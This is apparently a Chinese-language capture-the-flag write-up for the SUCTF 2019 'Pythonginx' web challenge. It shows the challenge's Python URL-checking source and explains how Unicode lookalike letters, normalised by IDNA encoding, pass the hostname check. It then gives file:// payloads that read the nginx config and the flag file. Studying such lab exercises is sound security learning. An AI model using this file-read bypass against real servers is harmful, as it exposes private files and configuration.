# [SUCTF 2019]Pythonginx
![](<./img/Pasted image 20221218131056.png>)

---
首页长这样

![](<./img/Pasted image 20221218140730.png>)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <form method="GET" action="[getUrl](view-source:http://8ff217ff-a7da-485a-a779-5fc0748bcc96.node4.buuoj.cn:81/getUrl)">
        URL:<input type="text" name="url"/>
        <input type="submit" value="Submit"/>
    </form>

    <code>
        
        @app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    </code>
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
</body>
</html>
```
字符是好东西（喜

上[数学字母数字符号](https://zh.wikipedia.org/zh-hans/%E6%95%B0%E5%AD%A6%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%AC%A6%E5%8F%B7)，更有多种变体任您选择

```python
url='http://𝓼𝓾𝓬𝓽𝓯.𝓬𝓬'
```

![](<./img/Pasted image 20221218142130.png>)

标题和注释明示我们和`nginx`有关，尝试访问`/usr/local/nginx/conf/nginx.conf`
```python
url='file://𝓼𝓾𝓬𝓽𝓯.𝓬𝓬/usr/local/nginx/conf/nginx.conf'
```

```nginx
server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /app/static;
    }
    # location /flag {
    #     alias /usr/fffffflag;
    # }
}
```

```python
url='file://𝓼𝓾𝓬𝓽𝓯.𝓬𝓬/usr/fffffflag'
```

![](<./img/Pasted image 20221218144842.png>)

#Web #python #nginx #字符 